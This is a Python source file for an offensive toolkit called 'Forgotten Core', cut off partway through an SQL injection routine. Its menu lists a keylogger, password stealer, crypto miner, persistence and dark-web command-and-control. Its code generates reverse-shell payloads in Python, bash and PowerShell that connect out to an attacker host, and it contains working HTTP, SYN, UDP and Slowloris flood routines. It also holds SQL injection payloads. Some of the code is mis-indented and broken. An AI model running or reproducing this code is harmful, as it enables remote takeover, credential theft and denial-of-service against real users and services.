#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════
# FORGOTTEN CORE v2.0 - Architect 02 Penetration Suite
# "What is buried shall remain buried. What is forgotten shall rise."
# Full Version - 20+ Modules | Termux Compatible | No Root Required
# ═══════════════════════════════════════════════════════════════════════

import os
import sys
import time
import hashlib
import subprocess
import socket
import base64
import random
import string
import re
import json
import threading
from datetime import datetime
from ai_integration import AIGenerator
from ddos_module import DDoSAttack
from auto_exploiter import AutoExploiter
# New modules
from persistence_module import Persistence
from file_transfer import FileTransfer
from screenshot_module import ScreenshotCapture
from keylogger_module import Keylogger
from password_stealer import PasswordStealer
from crypto_miner import CryptoMiner
from auto_updater import AutoUpdater
from darkweb_c2 import DarkWebC2

# Check for optional imports
try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    from cryptography.fernet import Fernet
except:
    os.system("pip install cryptography")
    from cryptography.fernet import Fernet

# ============================================================
# COLOR CODES
# ============================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DARK = '\033[90m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# ============================================================
# MAIN CORE CLASS
# ============================================================

class ForgottenCore:
    def __init__(self):
        self.version = "2.0"
        self.codename = "Echoes of the Void"
        self.user = "forgotten"
        self.host = "void"
        self.void_dir = os.path.expanduser("~/.forgotten_core")
        self.payload_dir = f"{self.void_dir}/payloads"
        self.osint_dir = f"{self.void_dir}/osint"
        self.scan_dir = f"{self.void_dir}/scans"
        for d in [self.void_dir, self.payload_dir, self.osint_dir, self.scan_dir]:
            os.makedirs(d, exist_ok=True)
    
    def check_ip_access(self):
        """Cek apakah IP diizinkan"""
        try:
            import requests
            current_ip = requests.get('https://api.ipify.org', timeout=5).text.strip()
            
            # Load whitelist dari file
            whitelist_file = f"{self.void_dir}/whitelist.txt"
            if os.path.exists(whitelist_file):
                with open(whitelist_file, 'r') as f:
                    allowed_ips = [line.strip() for line in f.readlines()]
            else:
                allowed_ips = ["103.247.14.169"]
            
            if current_ip not in allowed_ips:
                print(f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                    ACCESS DENIED!                              ║
║                                                                ║
║  IP Anda: {current_ip}                                ║
║  IP tidak terdaftar dalam whitelist.                          ║
║                                                                ║
║  Hubungi administrator untuk mendapatkan akses.               ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
                """)
                return False
            else:
                print(f"{Colors.GREEN}[✓] Akses diizinkan untuk IP: {current_ip}{Colors.END}")
                time.sleep(1)
                return True
        except:
            return True
        
    def get_path(self):
        p = os.getcwd().replace(os.path.expanduser("~"), "~")
        return p
    
    def prompt(self):
        path = self.get_path()
        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.RED}{self.user}@{Colors.RED}{self.host}{Colors.RED})-{Colors.RED}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
    
    def clear(self):
        os.system("clear")
        self.banner()
    
    def banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║  ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗    ║
║  ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║    ║
║  █████╗  ██║   ██║██████╔╝██║   ██║   ██║      ██║   █████╗  ██╔██╗ ██║    ║
║  ██╔══╝  ██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██╔══╝  ██║╚██╗██║    ║
║  ██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║      ██║   ███████╗██║ ╚████║    ║
║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝    ║
║                         ██████╗ ██████╗ ██████╗ ███████╗                 ║
║                        ██╔════╝██╔═══██╗██╔══██╗██╔════╝                 ║
║                        ██║     ██║   ██║██████╔╝█████╗                   ║
║                        ██║     ██║   ██║██╔══██╗██╔══╝                   ║
║                        ╚██████╗╚██████╔╝██║  ██║███████╗                 ║
║                         ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                 ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.PURPLE}{Colors.BOLD}                    FORGOTTEN CORE v{self.version} - {self.codename}{Colors.END}
{Colors.DARK}{Colors.DIM}               "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
        """
        print(banner)
    
    def show_menu(self):
        menu = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║                         MAIN MENU                                                 ║
╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.GREEN}[01]{Colors.WHITE} phone / tel    {Colors.DARK}» Phone number OSINT{Colors.END}
{Colors.GREEN}[02]{Colors.WHITE} ip / geo       {Colors.DARK}» IP geolocation tracker{Colors.END}
{Colors.GREEN}[03]{Colors.WHITE} username / user{Colors.DARK}» Check username on social media{Colors.END}
{Colors.GREEN}[04]{Colors.WHITE} subdomain / sub{Colors.DARK}» Subdomain scanner{Colors.END}
{Colors.GREEN}[05]{Colors.WHITE} port / scan    {Colors.DARK}» Fast TCP port scanner{Colors.END}
{Colors.GREEN}[06]{Colors.WHITE} dork / google  {Colors.DARK}» Google dork generator{Colors.END}
{Colors.GREEN}[07]{Colors.WHITE} email / mail   {Colors.DARK}» Email OSINT lookup{Colors.END}
{Colors.GREEN}[08]{Colors.WHITE} whois          {Colors.DARK}» WHOIS domain lookup{Colors.END}
{Colors.GREEN}[09]{Colors.WHITE} dns            {Colors.DARK}» DNS records lookup{Colors.END}
{Colors.GREEN}[10]{Colors.WHITE} payload / p    {Colors.DARK}» Generate reverse shell payload{Colors.END}
{Colors.GREEN}[11]{Colors.WHITE} c2 / server    {Colors.DARK}» Start C2 / listener server{Colors.END}
{Colors.GREEN}[12]{Colors.WHITE} stealth / s    {Colors.DARK}» Clean traces and logs{Colors.END}
{Colors.GREEN}[13]{Colors.WHITE} anon / a       {Colors.DARK}» Anonymity (Tor network){Colors.END}
{Colors.GREEN}[14]{Colors.WHITE} crypt / encrypt{Colors.DARK}» AES file encryption/decryption{Colors.END}
{Colors.GREEN}[15]{Colors.WHITE} hash           {Colors.DARK}» Hash generator (MD5, SHA1, SHA256){Colors.END}
{Colors.GREEN}[16]{Colors.WHITE} encode         {Colors.DARK}» Base64/URL encoder decoder{Colors.END}
{Colors.GREEN}[17]{Colors.WHITE} passgen / pg   {Colors.DARK}» Random password generator{Colors.END}
{Colors.GREEN}[18]{Colors.WHITE} malware / mw   {Colors.DARK}» Educational malware generator{Colors.END}
{Colors.GREEN}[19]{Colors.WHITE} bot / discord   {Colors.DARK}» Start Discord Bot{Colors.END}
{Colors.GREEN}[20]{Colors.WHITE} c2server        {Colors.DARK}» Start C2 Server{Colors.END}
{Colors.GREEN}[21]{Colors.WHITE} telegbot        {Colors.DARK}» Start Telegram Bot{Colors.END}
{Colors.GREEN}[22]{Colors.WHITE} ai / gpt        {Colors.DARK}» AI Payload Generator{Colors.END}
{Colors.GREEN}[23]{Colors.WHITE} ddos / flood    {Colors.DARK}» DDoS Attack Module{Colors.END}
{Colors.GREEN}[24]{Colors.WHITE} exploit / auto  {Colors.DARK}» Auto Exploiter Scanner{Colors.END}
{Colors.GREEN}[25]{Colors.WHITE} persist / pst   {Colors.DARK}» Persistence Module{Colors.END}
{Colors.GREEN}[26]{Colors.WHITE} transfer / tf   {Colors.DARK}» File Transfer{Colors.END}
{Colors.GREEN}[27]{Colors.WHITE} capture / cap   {Colors.DARK}» Screenshot/Webcam{Colors.END}
{Colors.GREEN}[28]{Colors.WHITE} keylog / kl     {Colors.DARK}» Keylogger{Colors.END}
{Colors.GREEN}[29]{Colors.WHITE} steal / st      {Colors.DARK}» Password Stealer{Colors.END}
{Colors.GREEN}[30]{Colors.WHITE} miner / mine    {Colors.DARK}» Crypto Miner{Colors.END}
{Colors.GREEN}[31]{Colors.WHITE} update / up     {Colors.DARK}» Auto Updater{Colors.END}
{Colors.GREEN}[32]{Colors.WHITE} darkweb / dw    {Colors.DARK}» Dark Web C2{Colors.END}
{Colors.GREEN}[33]{Colors.WHITE} clear / cls    {Colors.DARK}» Clear screen{Colors.END}
{Colors.GREEN}[34]{Colors.WHITE} help / ?       {Colors.DARK}» Show this menu{Colors.END}
{Colors.GREEN}[00]{Colors.WHITE} exit / quit    {Colors.DARK}» Exit Forgotten Core{Colors.END}

{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
        """
        print(menu)
        
    def persistence_module(self):
        """Install persistence"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PERSISTENCE MODULE                               ║
║              "Survive the reboot"                                    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        script = input(f"{self.prompt()}Script to persist (default: this script) > ") or __file__
        p = Persistence(script)
        p.install()
    
    def file_transfer(self):
        """Upload/download files"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    FILE TRANSFER                                      ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Upload file to C2")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Download file from C2")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} List files in directory")
        choice = input(self.prompt())
        
        ft = FileTransfer()
        bot_id = socket.gethostname()
        
        if choice == '1':
            filepath = input(f"{self.prompt()}File to upload > ")
            result = ft.upload_file(filepath, bot_id)
            print(f"{Colors.GREEN}{result}{Colors.END}")
        elif choice == '2':
            filename = input(f"{self.prompt()}Filename > ")
            save_path = input(f"{self.prompt()}Save path > ")
            result = ft.download_file(filename, save_path)
            print(f"{Colors.GREEN}{result}{Colors.END}")
        elif choice == '3':
            directory = input(f"{self.prompt()}Directory (default: .) > ") or "."
            result = ft.list_files(directory)
            for f in result.get('files', []):
                print(f"  {f['name']} - {f.get('size', 0)} bytes")
    
    def capture_module(self):
        """Screenshot/Webcam capture"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    SCREENSHOT & WEBCAM                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Capture Screenshot")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Capture Webcam")
        choice = input(self.prompt())
        
        sc = ScreenshotCapture()
        
        if choice == '1':
            data = sc.capture_screenshot()
            if data:
                filename = f"{self.payload_dir}/screenshot_{int(time.time())}.png"
                import base64
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(data))
                print(f"{Colors.GREEN}[+] Screenshot saved: {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Screenshot failed{Colors.END}")
        elif choice == '2':
            data = sc.capture_webcam()
            if data:
                filename = f"{self.payload_dir}/webcam_{int(time.time())}.jpg"
                import base64
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(data))
                print(f"{Colors.GREEN}[+] Webcam photo saved: {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Webcam capture failed{Colors.END}")
    
    def keylogger_module(self):
        """Start keylogger"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    KEYLOGGER MODULE                                  ║
║              "Every keystroke is mine"                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        print(f"{Colors.YELLOW}[!] Keylogger will run in background{Colors.END}")
        print(f"{Colors.CYAN}[*] Press Ctrl+C to stop{Colors.END}")
        
        kl = Keylogger()
        try:
            kl.start()
        except KeyboardInterrupt:
            kl.stop()
            print(f"{Colors.GREEN}[+] Keylogger stopped. Logs: {kl.log_file}{Colors.END}")
    
    def password_stealer(self):
        """Steal passwords"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PASSWORD STEALER                                  ║
║              "Harvest the credentials"                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        ps = PasswordStealer()
        print(f"{Colors.CYAN}[*] Stealing passwords...{Colors.END}")
        passwords = ps.steal_all()
        
        if passwords:
            filename = f"{self.payload_dir}/stolen_passwords_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(passwords, f, indent=2)
            print(f"{Colors.GREEN}[+] Found {len(passwords)} passwords{Colors.END}")
            print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
            
            for p in passwords[:10]:
                print(f"  {p['type']}: {p['url']} - {p['username']}")
        else:
            print(f"{Colors.RED}[!] No passwords found{Colors.END}")
    
    def crypto_miner(self):
        """Start crypto miner"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    CRYPTO MINER                                      ║
║              "Make money from the machine"                           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        wallet = input(f"{self.prompt()}Wallet address > ")
        pool = input(f"{self.prompt()}Pool URL (default: pool.supportxmr.com:3333) > ") or "pool.supportxmr.com:3333"
        duration = input(f"{self.prompt()}Duration seconds (0 for infinite) > ") or "0"
        
        miner = CryptoMiner(wallet, pool)
        print(f"{Colors.CYAN}[*] Starting miner...{Colors.END}")
        
        if int(duration) > 0:
            miner.mine_background(int(duration))
        else:
            process = miner.mine_background()
            if process:
                print(f"{Colors.GREEN}[+] Mining started!{Colors.END}")
                print(f"{Colors.YELLOW}[!] Press Enter to stop...{Colors.END}")
                input()
                process.terminate()
                print(f"{Colors.GREEN}[+] Mining stopped{Colors.END}")
    
    def auto_updater(self):
        """Update Forgotten Core"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    AUTO UPDATER                                       ║
║              "Stay up to date"                                        ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        updater = AutoUpdater()
        print(f"{Colors.CYAN}[*] Checking for updates...{Colors.END}")
        result = updater.check_update()
        
        if result.get('update_available'):
            print(f"{Colors.YELLOW}[!] Update available!{Colors.END}")
            print(f"    Current: {result['current']}")
            print(f"    Latest: {result['latest']}")
            confirm = input(f"{self.prompt()}Install update? (y/n) > ")
            
            if confirm.lower() == 'y':
                print(f"{Colors.CYAN}[*] Updating...{Colors.END}")
                update_result = updater.perform_update()
                if update_result.get('success'):
                    print(f"{Colors.GREEN}[+] Update successful!{Colors.END}")
                    confirm_restart = input(f"{self.prompt()}Restart now? (y/n) > ")
                    if confirm_restart.lower() == 'y':
                        updater.restart_app()
                else:
                    print(f"{Colors.RED}[!] Update failed: {update_result.get('error')}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] Already up to date!{Colors.END}")
    
    def darkweb_c2(self):
        """Start C2 as Tor hidden service"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    DARK WEB C2                                       ║
║              "Anonymous Command & Control"                           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        port = input(f"{self.prompt()}C2 port (default: 5000) > ") or "5000"
        dw = DarkWebC2(int(port))
        
        print(f"{Colors.CYAN}[*] Setting up Tor hidden service...{Colors.END}")
        onion = dw.start_c2_with_tor()
        
        if onion:
            print(f"{Colors.GREEN}[+] Hidden Service: http://{onion}{Colors.END}")
            print(f"{Colors.CYAN}[*] Start your web panel with: cd web_panel && python3 app.py{Colors.END}")
            print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop...{Colors.END}")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}[+] Dark Web C2 stopped{Colors.END}")
             
             
    def ai_generate(self):
        """Generate payload with AI"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    AI PAYLOAD GENERATOR                              ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
            print(f"{Colors.GREEN}[1]{Colors.WHITE} Generate Reverse Shell")
            print(f"{Colors.GREEN}[2]{Colors.WHITE} Analyze Vulnerability")
            print(f"{Colors.GREEN}[3]{Colors.WHITE} Generate Exploit")
            print(f"{Colors.GREEN}[0]{Colors.WHITE} Back")
        
            choice = input(self.prompt())
        
            if choice == '1':
                lhost = input(f"{self.prompt()}LHOST > ")
                lport = input(f"{self.prompt()}LPORT > ")
                print(f"{Colors.GREEN}[1] Python{Colors.END}")
                print(f"{Colors.GREEN}[2] Bash{Colors.END}")
                print(f"{Colors.GREEN}[3] PowerShell{Colors.END}")
                lang_choice = input(f"{self.prompt()}Pilih bahasa (1-3) > ")
            
            if lang_choice == '1':
                payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
                filename = f"{self.payload_dir}/ai_payload_{int(time.time())}.py"
                with open(filename, 'w') as f:
                    f.write(payload)
                print(f"{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
            elif lang_choice == '2':
                payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
                filename = f"{self.payload_dir}/ai_payload_{int(time.time())}.sh"
                with open(filename, 'w') as f:
                    f.write(payload)
                print(f"{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
            elif lang_choice == '3':
                payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
                filename = f"{self.payload_dir}/ai_payload_{int(time.time())}.ps1"
                with open(filename, 'w') as f:
                    f.write(payload)
                print(f"{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
                
            elif choice == '2':
                url = input(f"{self.prompt()}Target URL > ")
                print(f"{Colors.CYAN}[*] Analyzing {url}...{Colors.END}")
                print(f"""
{Colors.GREEN}[+] Analysis Result:{Colors.END}
    Check for SQL Injection: ' OR '1'='1
    Check for XSS: <script>alert(1)</script>
    Check for LFI: ../../../../etc/passwd
    Check for Admin Panel: /admin, /wp-admin
    Check for Open Ports: Use port scanner
            """)
            
            elif choice == '3':
                vuln = input(f"{self.prompt()}Vulnerability type (sql/xss/lfi) > ")
                target = input(f"{self.prompt()}Target > ")
                print(f"{Colors.CYAN}[*] Generating exploit for {vuln}...{Colors.END}")
                print(f"""
{Colors.GREEN}[+] Exploit Template:{Colors.END}
# {vuln.upper()} Exploit for {target}
import requests

url = "{target}"
payload = "' OR '1'='1" if "{vuln}" == "sql" else "<script>alert(1)</script>"
response = requests.get(url + "?q=" + payload)
print(response.text[:500])
            """)
        
        
    def ddos_attack(self):
        """DDoS Attack Module - REAL VERSION"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    DDOS ATTACK MODULE                               ║
║                    REAL ATTACK VERSION                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} HTTP Flood (Layer 7)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} SYN Flood (Layer 4)")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} UDP Flood")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} Slowloris")
        print(f"{Colors.GREEN}[5]{Colors.WHITE} Multi-Threaded DDoS (All Methods)")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '1':
            url = input(f"{self.prompt()}Target URL > ")
            duration = int(input(f"{self.prompt()}Duration (seconds) > ") or "60")
            threads = int(input(f"{self.prompt()}Threads (500) > ") or "500")
            self.real_http_flood(url, duration, threads)
            
        elif choice == '2':
            target_ip = input(f"{self.prompt()}Target IP > ")
            target_port = int(input(f"{self.prompt()}Target Port (80) > ") or "80")
            duration = int(input(f"{self.prompt()}Duration (seconds) > ") or "60")
            threads = int(input(f"{self.prompt()}Threads (500) > ") or "500")
            self.real_syn_flood(target_ip, target_port, duration, threads)
            
        elif choice == '3':
            target_ip = input(f"{self.prompt()}Target IP > ")
            target_port = int(input(f"{self.prompt()}Target Port > "))
            duration = int(input(f"{self.prompt()}Duration (seconds) > ") or "60")
            threads = int(input(f"{self.prompt()}Threads (500) > ") or "500")
            self.real_udp_flood(target_ip, target_port, duration, threads)
            
        elif choice == '4':
            target_ip = input(f"{self.prompt()}Target IP > ")
            target_port = int(input(f"{self.prompt()}Target Port (80) > ") or "80")
            sockets = int(input(f"{self.prompt()}Sockets (500) > ") or "500")
            self.real_slowloris(target_ip, target_port, sockets)
            
        elif choice == '5':
            target_ip = input(f"{self.prompt()}Target IP > ")
            target_port = int(input(f"{self.prompt()}Target Port (80) > ") or "80")
            duration = int(input(f"{self.prompt()}Duration (seconds) > ") or "60")
            self.real_multi_ddos(target_ip, target_port, duration)
    
    def real_http_flood(self, url, duration, threads):
        """REAL HTTP Flood Attack"""
        import threading
        import requests
        import time
        import random
        
        stop_flag = threading.Event()
        attack_count = 0
        
        def flood():
            nonlocal attack_count
            headers_list = [
                {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'},
                {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B)'},
                {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'},
                {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'},
            ]
            
            while not stop_flag.is_set():
                try:
                    headers = random.choice(headers_list)
                    if random.choice([True, False]):
                        requests.get(url, headers=headers, timeout=3, verify=False)
                    else:
                        requests.post(url, headers=headers, timeout=3, verify=False)
                    attack_count += 1
                except:
                    pass
        
        print(f"{Colors.CYAN}[*] Starting HTTP Flood on {url}{Colors.END}")
        print(f"{Colors.CYAN}[*] Threads: {threads} | Duration: {duration}s{Colors.END}")
        
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        time.sleep(duration)
        stop_flag.set()
        
        print(f"{Colors.GREEN}[+] HTTP Flood Completed! Total requests: {attack_count}{Colors.END}")
    
    def real_syn_flood(self, target_ip, target_port, duration, threads):
        """REAL SYN Flood Attack (Layer 4)"""
        import threading
        import socket
        import time
        import random
        
        stop_flag = threading.Event()
        attack_count = 0
        
        def syn_flood():
            nonlocal attack_count
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.5)
                
                while not stop_flag.is_set():
                    try:
                        sock.connect((target_ip, target_port))
                        sock.send(b"SYN" * 1024)
                        attack_count += 1
                    except:
                        pass
                    finally:
                        try:
                            sock.close()
                        except:
                            pass
            except:
                pass
        
        print(f"{Colors.CYAN}[*] Starting SYN Flood on {target_ip}:{target_port}{Colors.END}")
        print(f"{Colors.CYAN}[*] Threads: {threads} | Duration: {duration}s{Colors.END}")
        
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=syn_flood)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        time.sleep(duration)
        stop_flag.set()
        
        print(f"{Colors.GREEN}[+] SYN Flood Completed! Total packets: {attack_count}{Colors.END}")
    
    def real_udp_flood(self, target_ip, target_port, duration, threads):
        """REAL UDP Flood Attack"""
        import threading
        import socket
        import time
        import random
        
        stop_flag = threading.Event()
        attack_count = 0
        
        def udp_flood():
            nonlocal attack_count
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(1024)
                
                while not stop_flag.is_set():
                    try:
                        sock.sendto(packet, (target_ip, target_port))
                        attack_count += 1
                    except:
                        pass
            except:
                pass
        
        print(f"{Colors.CYAN}[*] Starting UDP Flood on {target_ip}:{target_port}{Colors.END}")
        print(f"{Colors.CYAN}[*] Threads: {threads} | Duration: {duration}s{Colors.END}")
        
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=udp_flood)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        time.sleep(duration)
        stop_flag.set()
        
        print(f"{Colors.GREEN}[+] UDP Flood Completed! Total packets: {attack_count}{Colors.END}")
    
    def real_slowloris(self, target_ip, target_port, sockets):
        """REAL Slowloris Attack"""
        import threading
        import socket
        import time
        
        stop_flag = threading.Event()
        connections = []
        
        def slowloris_attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                sock.send(f"GET /?{int(time.time())} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept-language: en-US,en\r\n".encode())
                connections.append(sock)
                
                while not stop_flag.is_set():
                    try:
                        sock.send(f"X-Header: {int(time.time())}\r\n".encode())
                        time.sleep(10)
                    except:
                        break
            except:
                pass
        
        print(f"{Colors.CYAN}[*] Starting Slowloris on {target_ip}:{target_port}{Colors.END}")
        print(f"{Colors.CYAN}[*] Sockets: {sockets}{Colors.END}")
        
        for i in range(sockets):
            t = threading.Thread(target=slowloris_attack)
            t.daemon = True
            t.start()
            time.sleep(0.1)
        
        print(f"{Colors.GREEN}[+] Slowloris Running! {len(connections)} connections open{Colors.END}")
        input(f"{Colors.YELLOW}[*] Press Enter to stop Slowloris...{Colors.END}")
        stop_flag.set()
        
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        print(f"{Colors.GREEN}[+] Slowloris Stopped{Colors.END}")
    
    def real_multi_ddos(self, target_ip, target_port, duration):
        """MULTI-THREADED DDoS - All methods combined"""
        import threading
        import time
        
        print(f"{Colors.RED}{Colors.BOLD}[!] ACTIVATING MULTI-LAYER DDoS!{Colors.END}")
        print(f"{Colors.CYAN}[*] Target: {target_ip}:{target_port}{Colors.END}")
        print(f"{Colors.CYAN}[*] Duration: {duration}s{Colors.END}")
        print(f"{Colors.CYAN}[*] Launching all attack vectors...{Colors.END}\n")
        
        # Start all attack methods
        t1 = threading.Thread(target=self.real_http_flood, args=(f"http://{target_ip}", duration, 200))
        t2 = threading.Thread(target=self.real_syn_flood, args=(target_ip, target_port, duration, 200))
        t3 = threading.Thread(target=self.real_udp_flood, args=(target_ip, target_port, duration, 200))
        
        t1.daemon = True
        t2.daemon = True
        t3.daemon = True
        
        t1.start()
        t2.start()
        t3.start()
        
        # Wait for duration
        time.sleep(duration)
        
        print(f"\n{Colors.GREEN}[+] Multi-Layer DDoS Completed!{Colors.END}")
        print(f"{Colors.GREEN}[+] HTTP Flood, SYN Flood, UDP Flood finished{Colors.END}")
    
    def auto_exploit(self):
        """Auto Exploiter Scanner - REAL VERSION"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    AUTO EXPLOITER                                      ║
║              REAL VULNERABILITY SCANNER & EXPLOIT                      ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} SQL Injection Scanner & Exploit")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} XSS Scanner & Exploit")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} LFI/RFI Scanner & Exploit")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} Admin Panel Finder")
        print(f"{Colors.GREEN}[5]{Colors.WHITE} Full Auto Exploit (All Methods)")
        print(f"{Colors.GREEN}[6]{Colors.WHITE} WordPress Vulnerability Scanner")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '1':
            target = input(f"{self.prompt()}Target URL (with parameter) > ")
            self.real_sqli_exploit(target)
        elif choice == '2':
            target = input(f"{self.prompt()}Target URL > ")
            self.real_xss_exploit(target)
        elif choice == '3':
            target = input(f"{self.prompt()}Target URL (with parameter) > ")
            self.real_lfi_exploit(target)
        elif choice == '4':
            target = input(f"{self.prompt()}Target Domain > ")
            self.real_admin_finder(target)
        elif choice == '5':
            target = input(f"{self.prompt()}Target URL > ")
            self.real_full_auto_exploit(target)
        elif choice == '6':
            target = input(f"{self.prompt()}WordPress URL > ")
            self.real_wp_scanner(target)
    
    def real_sqli_exploit(self, url):
        """REAL SQL Injection Scanner & Exploit"""
        import requests
        import time
        import re
        
        print(f"{Colors.CYAN}[*] Scanning SQL Injection on: {url}{Colors.END}\n")
        
        # SQL Injection payloads
        payloads = [
            "'", "''", "' OR '1'='1", "' OR 1=1--", "1' ORDER BY 1--",
            "1' UNION SELECT NULL--", "' AND SLEEP(5)--", "admin'--",
            "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1'--",
            "'; DROP TABLE users--", "' UNION SELECT @@version--"
        ]
        
        vulnerable = False
        found_payloads = []
        
        for payload in payloads:
            try:
                test_url = url + payload
                start_time = time.time()
